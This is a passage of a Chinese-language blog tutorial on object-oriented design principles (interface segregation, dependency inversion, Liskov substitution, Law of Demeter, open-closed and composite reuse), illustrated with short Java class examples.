class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vehicle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runRoad</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在公路上跑"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在道路上跑");</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runAir</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在天上飞"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在空中飘");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Vehicle vehicle = <span class="keyword">new</span> Vehicle();</span><br><span class="line">    String name1 = <span class="string">"汽车"</span>;</span><br><span class="line">    String name2 = <span class="string">"飞机"</span>;</span><br><span class="line">    <span class="keyword">if</span>(isRoadVehicle(name1))&#123;</span><br><span class="line">        vehicle.runRoad(name1);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(isAirVehicle(name2))&#123;</span><br><span class="line">            vehicle.runAir(name2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>降低类的复杂度，保证每个类的负责事务单一</li>
<li>提高类的可读性与可维护性</li>
<li>提高代码的健壮性，降低因为代码变更带来的风险</li>
<li>在逻辑足够简单的情况下，可以代码级别地违反该原则</li>
</ol>
<h2 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h2><p><strong>接口隔离原则</strong>（英语：interface-segregation principles， 缩写：ISP）客户端不应依赖它不需要的接口。类间的依赖关系应该建立在最小的接口上。</p>
<p>如果一个接口在实现时，部分方法由于冗余被客户端空实现，则应该将接口拆分，让实现类只需依赖自己需要的接口方法。换言之，不要把一大堆方法塞进一个接口里，导致这个接口变得臃肿无比。应该要根据实际需要，让接口中只有用得上的方法，也就是说要细化我们的接口。</p>
<p>有观众就要问了，你说这些是森莫意思？我们来拿例子来说明。</p>
<p>考虑我们要实现鱼和鸟这两个类，它们共有的方法是<code>breath()</code>和<code>sleep()</code>，特有的方法分别是<code>swim()</code>和<code>fly()</code>。根据依赖倒转原则，我们使用接口。</p>
<p>错误的实现方式如下：</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202012/03/1606979646815-1606993794924.png" alt="1606979646815"></p>
<p>我们直接使用一个 Animal 接口完成了这四个方法，而实现这个接口的两个实现类则必须要实现其不需要的方法。（例如 <code>fishImpl</code> 中的 <code>fly()</code>）</p>
<p>在实体类中的使用时，我们只需要传入 Animal ，即可实现每个实体类所需要的三个方法。但是，在实体类中我们同样可以使用不被需要的第四个方法，这被称作接口污染。整体代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Animal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">breath</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * BirdImpl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">birdImpl</span> <span class="keyword">implements</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">breath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"bird - breath"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"bird - sleep"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"bird - fly"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"bird - swim"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * FishImpl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fishImpl</span> <span class="keyword">implements</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">breath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"fish - breath"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"fish - sleep"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"fish - fly"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"fish - swim"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Bird</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bird</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bird_breath</span><span class="params">(Animal animal)</span></span>&#123;</span><br><span class="line">        animal.breath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bird_sleep</span><span class="params">(Animal animal)</span></span>&#123;</span><br><span class="line">        animal.sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bird_fly</span><span class="params">(Animal animal)</span></span>&#123;</span><br><span class="line">        animal.fly();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fish</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fish</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fish_breath</span><span class="params">(Animal animal)</span></span>&#123;</span><br><span class="line">        animal.breath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fish_sleep</span><span class="params">(Animal animal)</span></span>&#123;</span><br><span class="line">        animal.sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fish_swim</span><span class="params">(Animal animal)</span></span>&#123;</span><br><span class="line">        animal.swim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正确的实现方法应该是这样的：</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202012/03/1606981135439-1606993794925.png" alt="1606981135439"></p>
<p>我们将原来的 Animal 接口拆分成三个接口，如果这个实现类需要接口中的所有方法，那么我们才去实现它。实体类中不会出现冗余的不被需要的方法。这样就保证它们的依赖关系建立在最小的接口上。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Common_Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">breath</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Air_Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Water_Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">birdImpl</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Air_Animal</span>, <span class="title">Common_Animal</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fishImpl</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Water_Animal</span>,<span class="title">Common_Animal</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bird</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bird_breath</span><span class="params">(Common_Animal common_animal)</span></span>&#123;</span><br><span class="line">        common_animal.breath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bird_sleep</span><span class="params">(Common_Animal common_animal)</span></span>&#123;</span><br><span class="line">        common_animal.sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bird_fly</span><span class="params">(Air_Animal air_animal)</span></span>&#123;</span><br><span class="line">        air_animal.fly();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fish</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fish_breath</span><span class="params">(Common_Animal common_animal)</span></span>&#123;</span><br><span class="line">        common_animal.breath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fish_sleep</span><span class="params">(Common_Animal common_animal)</span></span>&#123;</span><br><span class="line">        common_animal.sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fish_swim</span><span class="params">(Water_Animal waterAnimal)</span></span>&#123;</span><br><span class="line">        waterAnimal.swim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接口隔离原则和单一职责原则非常类似。单一职责原则要求接口的职责是单一的，而接口隔离原则要求接口尽量细化，它们有异曲同工之妙，都是要让我们的接口功能尽量单一，尽量小。</p>
<p>但是，单一职责原则的着重点是在“职责”，而接口隔离原则只单纯地要求接口最小化。那么，如果已经满足单一职责原则的接口，在当前的需求下还可以继续细化，那么还需要细化吗？答案是不要再细化了。在实践中，接口设计的粒度越小，系统就越灵活，这是事实。但是灵活的同时也带来了系统的复杂化，导致开发难度增加。所以接口并不是越小越好，必须要有一个度。当单一职责原则和接口隔离原则存在矛盾时，以满足单一职责原则为底线。</p>
<p>以上这段来自 <a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E4%B8%80%E5%8A%9F%E8%83%BD%E5%8E%9F%E5%88%99" target="_blank" rel="noopener">简书</a> 。</p>
<h2 id="依赖反转原则"><a href="#依赖反转原则" class="headerlink" title="依赖反转原则"></a>依赖反转原则</h2><p><strong>依赖反转原则</strong>（Dependency inversion principle，DIP）是指一种特定的解耦（传统的依赖关系建立在高层次上，而具体的策略设置则应用在低层次的模块上）形式，使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。</p>
<p>该原则规定：</p>
<ol>
<li>高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。</li>
<li>抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。</li>
</ol>
<p>这是什么意思呢？下面是一个错误示范：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Email:hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Receiver</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receive</span><span class="params">(Email email)</span></span>&#123;</span><br><span class="line">        System.out.println(email.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不难看出，代码中 Email 是底层类，Receiver 是高层类。但是这里的高层类却完全依赖于底层类的实现。此处的 <code>receive()</code> 方法需要传入一个具体的底层类。</p>
<p>这有什么问题吗？高层类总要或多或少地知道底层类的东西啊！注意，知道 != 依赖。这里的方法<strong>完全依赖于</strong> Email 实体类。如果是电话、短信、微信，这个 <code>receive()</code>方法直接被废掉了。这就是所谓的<u>高层次的模块不应该依赖于低层次的模块</u>。</p>
<p>正确的做法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Message</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span> <span class="keyword">implements</span> <span class="title">Message</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Email:hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wechat</span> <span class="keyword">implements</span> <span class="title">Message</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Wechat:hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Receiver</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receive</span><span class="params">(Message msg)</span></span>&#123;</span><br><span class="line">        System.out.println(msg.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，在这个例子里：</p>
<ol>
<li>Receiver 类不再依赖 Email 类，而是依赖 Message 接口</li>
<li>Email、Wechat 类不再是自顾自地实现，而是依赖 Message 接口的规范</li>
<li>在逻辑上，先定义好了  Message 接口，才能以此为规范实现具体的类。（无论是上层类还是下层类）这就是所谓的 <u>抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口</u>。</li>
<li>在这里，接收者依旧知道传入的信息中有 <code>getInfo()</code>,但是它并不用关心这个方法是被谁实现、怎样实现的。知道，但不依赖。</li>
</ol>
<p>小结</p>
<ol>
<li>依赖倒转（倒置）的中心思想是<strong>面向接口编程</strong></li>
<li>依赖倒转原则是基于这样的设计理念：相对于细节的多变性，抽象的东西要稳定的多。以抽象为基础搭建的架构比以细节为基础的架构要稳定的多。在jaνa中，抽象指的是接口或抽象类，细节就是具体的实现类</li>
<li>使用接口或抽象类的目的是制定好规范，而不涉及任何具体的操作，把展现细节的任务交给他们的实现类去完成</li>
</ol>
<blockquote>
<p>多逼逼两句：</p>
<p>就像前后端分离一样，应该是先制定出前后端的交互接口，然后在基于接口文档分别开发。前后端彼此并不需要操心对方如何实现，只需要将封装好的接口拿过来用即可。而不是直接调用后端的代码</p>
</blockquote>
<h2 id="里氏替换原则"><a href="#里氏替换原则" class="headerlink" title="里氏替换原则"></a>里氏替换原则</h2><p><strong>里氏替换原则</strong>（Liskov Substitution principle）是对子类型的特别定义。内容可以描述为： “派生类（子类）对象可以在程式中代替其基类（超类）对象。”</p>
<blockquote>
<p>我们先来回忆一下知识点：</p>
<p>继承：</p>
<p>子类继承父类，父类派生子类。父类中的所有属性方法都被子类继承了（尽管声明为 private 的无法被子类访问，但是它们也被继承了）。子类可以对父类的方法进行 重写（override）</p>
<p>多态：</p>
<p>如果子类继承了父类，并且子类重写了父类的方法，并且有父类引用指向子类对象（<code>Parent p = new Child()</code>）那么，当我们调用 <code>p</code> 的某方法时，实际运行的是被子类重写后的该方法。</p>
</blockquote>
<p>也就是说，我们希望所有用到父类的地方，都可以将其换为子类。并且程序还能继续运行。</p>
<p>也就是说，尽量不要让子类重写父类方法，<strong>可以拓展，不要修改</strong>。</p>
<p><em>对了，对于抽象类的，我们称之为实现，而非重写。</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello my dear friend!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误示范，重写了父类方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"YOU A Son of Bitch!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示范， 只拓展不修改</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Daughter</span> <span class="keyword">extends</span> <span class="title">Parent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello,uncle!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继承实际上让两个类之间的耦合性增强了。如果我们非要重写这个方法呢？那么可以通过聚合、组合、依赖来解决问题。</p>
<p>组合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello my dear friend!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Parent parent;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        parent.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了保证这一原则，我们在 Java 中可以对父类的、不想被改变的方法加上 <code>final</code> 修饰符</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello my dear friend!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;       <span class="comment">//  报错: overridden method is final! </span></span><br><span class="line">        System.out.println(<span class="string">"YOU A Son of Bitch!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="迪米特法则"><a href="#迪米特法则" class="headerlink" title="迪米特法则"></a>迪米特法则</h2><p><strong>得墨忒耳定律</strong>（<strong>Law of Demeter</strong>，缩写<strong>LoD</strong>）亦被称作“最少知识原则（Principle of Least Knowledge）”</p>
<ol>
<li>每个单元对于其他的单元只能拥有有限的知识：只是与当前单元紧密联系的单元；</li>
<li>每个单元只能和它的朋友交谈：不能和陌生单元交谈；</li>
<li>只和自己直接的朋友交谈。</li>
</ol>
<p>这个原理的名称来源于希腊神话中的农业女神，孤独的得墨忒耳。</p>
<p>一个类对自己依赖的类知道的越少越好。对于被依赖的类不管多么复杂，都尽量将逻辑封装在类的内部。对外除了提供的 public方法，不对外泄露任何信息。</p>
<p>迪米特法则还有个更简单的定义：只与直接的朋友通信</p>
<p>直接的朋友：每个对象都会与其他对象有耦贪关系，只要两个对象之间有耦合关系我们就说这两个对象之间是朋友关系。耦合的方式很多，依赖，关联，组合，聚合等。其中，我们称出现成员变量，方法参数，方法返回值中的类为直接的朋友，而出现在局部变量中的类不是直接的朋友。也就是说，陌生的类最好不要以局部变量的形式出现在类的内部。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello my dear friend!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确：成员变量parent是直接朋友</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Parent parent;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        parent.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误：在这里，局部变量parent是个陌生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	Parent parent;</span><br><span class="line">        parent.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再来个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Message</span></span>&#123;</span><br><span class="line">    <span class="comment">// ...这里就不实现了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg = <span class="string">"hello,email"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">getMsg</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Receiver</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printAllMessage</span><span class="params">(Email email)</span></span>&#123;</span><br><span class="line">        Message msg = email.getMsg();</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是错误示范。</p>
<p>在 <code>Receiver</code> 的 <code>printAllMessage</code> 方法中。引入了一个陌生类 <code>Message</code>,它不是成员变量，方法参数，方法返回值。</p>
<p>当然这里直接传入Email类也不符合依赖反转原则。这里就不细究了。</p>
<p>正确示范如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg = <span class="string">"hello,email"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">getMsg</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printMsg</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Receiver</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printAllInfo</span><span class="params">(Email email)</span></span>&#123;</span><br><span class="line">        email.printMsg();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，我们就规避掉了Message在Receiver类中的出现。</p>
<p>小结</p>
<ol>
<li>迪米特法则降低了类与类之间的耦合（不出现陌生类）</li>
<li>但并不意味着完全消除类之间的依赖关系，只是尽量降低。（允许出现直接朋友）</li>
<li></li>
</ol>
<h2 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h2><p><strong>开闭原则</strong>规定“<em>软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的</em>”，这意味着一个实体是允许在不改变它的源代码的前提下变更它的行为</p>
<p>说实话我完全没搞懂这个原则是什么意思。表述的太过模糊了。我只能从他人的表述/笔记中知道：这一原则是整个设计模式的核心原则，或者说其他的原则、设计模式都是以满足这个原则为目的的，或者说，如果项目能够满足其他原则/模式，那么自然也就满足了开闭原则。</p>
<h2 id="合成复用原则"><a href="#合成复用原则" class="headerlink" title="合成复用原则"></a>合成复用原则</h2><p>原则是尽量使用合成/聚合的方式，而不是使用继承。</p>
